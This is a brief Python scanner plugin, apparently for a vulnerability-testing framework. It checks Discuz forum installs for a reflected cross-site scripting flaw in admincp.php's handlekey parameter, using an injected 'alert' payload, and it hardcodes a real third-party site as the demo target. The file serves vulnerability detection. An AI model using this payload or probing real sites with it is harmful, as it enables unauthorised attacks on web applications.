#Referer:http://www.wooyun.org/bugs/wooyun-2014-084097
def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(args):
    payload = "/admincp.php?infloat=yes&handlekey=123);alert(/testvul/);//"
    verify_url = args + payload
    code, head, content, errcode,finalurl = curl.curl(verify_url)
    if code==200 and "if($('return_123);alert(/testvul/);//'" in content:
        security_info(verify_url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.misssky.cn/')[1])
